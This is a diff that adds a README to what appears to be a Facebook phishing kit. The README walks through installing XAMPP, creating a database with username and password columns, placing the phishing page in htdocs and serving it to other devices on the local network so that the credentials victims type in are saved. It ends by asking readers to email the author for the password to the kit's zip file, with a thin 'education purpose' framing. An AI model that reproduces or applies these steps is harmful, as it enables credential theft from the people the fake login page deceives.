@@ -1,0 +1,38 @@
+now first we can download xampp and install it  run it for starting local server 
+,
+,
+click the start action of  apache and my sql and minimize it.......
+,
+,
+then we can open borwser and type localhost/phpmyadmin in address bar...........
+,
+,
+and create a databas name facebook and inside it create a table name facebbok with two collum ..........
+,
+,
+name that two collum username and password............
+
+,
+,
+after it extract the the file and copy this facebook file in location C:\xampp\htdocs
+,
+,
+go to an another tab type localhost/facebook in address bar and see the facebook phishing page after entering the username and password
+the data is saved to your database.....
+,
+,
+for other device in same network type yourlocalIp/facebook ......
+,
+,
+,
+,
+the facebook zip file is protected please mail me for passaword....
+i can give the password for free....
+copy bellow text and send me on mdey0108@gmail.com for password...
+
+------------------------------------------------------------------------
+
+hey i am from github and i need the password of facebook_phishing repository
+and this is only for education purpose
+
+-------------------------------------------------------------------------
